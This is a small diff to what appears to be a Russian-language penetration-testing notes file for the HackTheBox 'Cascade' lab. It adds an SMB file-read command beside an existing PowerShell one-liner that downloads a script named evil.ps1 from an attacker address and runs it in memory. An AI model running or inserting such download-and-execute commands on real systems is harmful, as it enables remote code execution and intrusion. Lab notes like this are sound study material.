@@ -30,3 +30,7 @@ Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {Objec
 # Загрузка скрипта и выполнение
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
+
+# Доступ к ресурсу SMB
+
+Get-Content //10.10.14.4/file
